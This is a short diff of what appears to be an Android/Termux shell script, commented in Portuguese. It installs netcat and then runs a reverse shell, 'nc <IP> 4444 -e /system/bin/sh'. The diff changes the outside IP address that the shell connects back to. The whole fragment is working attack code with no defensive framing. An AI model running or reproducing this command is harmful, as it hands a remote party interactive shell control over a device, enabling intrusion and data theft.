@@ -7,5 +7,5 @@ pkg update && pkg upgrade -y
 pkg install netcat -y
 
 # Executar o shell reverso
-nc 193.168.4.240 4444 -e /system/bin/sh
+nc 187.22.114.5 4444 -e /system/bin/sh
                                               
